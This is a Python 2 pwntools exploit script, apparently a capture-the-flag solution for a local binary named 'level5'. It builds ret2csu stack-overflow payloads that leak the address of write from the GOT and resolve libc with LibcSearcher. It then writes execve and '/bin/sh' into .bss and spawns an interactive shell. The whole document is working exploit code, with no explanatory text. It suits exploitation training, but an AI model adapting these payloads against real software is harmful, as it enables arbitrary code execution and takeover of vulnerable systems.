from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level='debug'

sh=process('./level5')
elf=ELF('./level5')
#gdb.attach(sh)
#pause()
csu_front=0x4005f0
csu_back=0x400606
write_got=elf.got['write']
read_got=elf.got['read']
start_addr=elf.sym['main']
bss_addr=elf.bss()
payload1='a'*0x88+p64(csu_back)+p64(0)+p64(0)+p64(1)+p64(write_got)+p64(1)+p64(write_got)+p64(8)+p64(csu_front)+'a'*0x38+p64(start_addr)

sh.sendlineafter('ld\n',payload1)
print '-----------------------1 send'
#write_addr=u64(sh.recv()[:8])
x=sh.recv()
print x
write_addr=u64(x[:8])

print "get write addr:"+str(hex(write_addr))

libc=LibcSearcher('write',write_addr)
base=write_addr-libc.dump('write')
system_addr=base+libc.dump('execve')
bin_sh_addr=base+libc.dump('str_bin_sh')

print "get system addr:"+str(hex(system_addr))
print "get bin_sh addr:"+str(hex(bin_sh_addr))

payload2='a'*0x88+p64(csu_back)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0)+p64(bss_addr)+p64(16)+p64(csu_front)+'a'*0x38+p64(start_addr)
sh.sendline(payload2)
print '-----------------------2 send'
pause()
sh.send(p64(system_addr))
sh.send('/bin/sh\x00')
print '+++++++++++++++++++++++++++++++++++++++++++++++'+sh.recv()
#pwnlib.gdb.attach(proc.pidof(sh)[0])b

payload3='a'*0x88+p64(csu_back)+p64(0)+p64(0)+p64(1)+p64(bss_addr)+p64(bss_addr+8)+p64(0)+p64(0)+p64(csu_front)+'a'*0x38+p64(start_addr)
print '------------------------------------------ready 3?'
pause()

sh.sendline(payload3)

sh.interactive()
